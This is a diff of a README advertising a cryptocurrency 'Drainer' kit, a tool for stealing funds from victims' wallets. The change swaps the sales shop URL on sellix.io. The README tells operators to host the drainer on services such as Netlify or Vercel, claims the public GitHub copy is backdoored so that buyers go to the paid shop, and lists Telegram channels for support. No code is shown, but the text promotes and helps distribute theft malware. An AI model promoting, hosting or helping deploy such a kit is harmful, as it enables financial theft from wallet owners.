@@ -1,4 +1,4 @@
-# **🧙🏼 Welcome!** *PUBLIC GITHUB IS BACKDOORED YOU SHOULD NOT USE https://web3eaters.sellix.io/*
+# **🧙🏼 Welcome!** *PUBLIC GITHUB IS BACKDOORED YOU SHOULD NOT USE https://opdrainer.sellix.io/*
 ### 📩 Like **all Drainers** you need to host to make it work (recommended: Hostinger, Netlify, Vercel, Github...)
 
 ---
@@ -30,7 +30,7 @@ To get instant support, contact us on [Telegram](https://t.me/soleaterdev)
 ## ` 🌊 Socials `
 
 - Telegram: https://t.me/soleaterdev
-- Shop: https://web3eaters.sellix.io/
+- Shop: https://opdrainer.sellix.io/
 - Group: https://t.me/opdrain
 
 ##### Please ⭐ the repo to support this project & follow next updates
